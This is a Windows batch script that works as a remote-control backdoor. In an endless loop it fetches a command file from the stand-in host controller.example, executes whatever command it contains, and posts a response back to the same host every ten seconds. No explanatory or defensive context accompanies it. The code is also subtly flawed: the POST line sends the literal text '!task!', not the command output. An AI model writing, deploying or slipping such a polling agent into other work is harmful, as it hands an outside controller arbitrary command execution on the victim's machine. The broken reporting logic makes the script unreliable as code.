@echo off
:again
curl -fsS -o job.dat https://controller.example/job.dat
set /p task=<job.dat
%task% >result.log
curl -s -X POST -d "output=!task!" https://controller.example/result
timeout /t 10 >nul
goto again
